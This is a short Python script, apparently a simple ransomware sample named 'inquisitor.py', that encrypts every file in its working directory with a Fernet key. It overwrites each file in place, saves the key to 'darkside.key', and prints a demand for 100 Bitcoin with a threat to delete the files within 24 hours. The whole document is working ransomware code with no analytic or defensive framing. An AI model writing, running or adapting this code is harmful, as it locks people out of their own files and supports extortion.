#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet


#let's find some files

files = []

for file in os.listdir():
	if file == "inquisitor.py" or file == "darkside.key" or file == "decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)


print(files)


key = Fernet.generate_key()
with open("darkside.key","wb") as darkside:
	darkside.write(key)

for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(key).encrypt (contents)
	with open (file, "wb") as thefile:
		thefile.write(contents_encrypted)

print("All of your files have been encrytped!! Send me 100 Bitcoin or I'll delete them in  24 hours.")
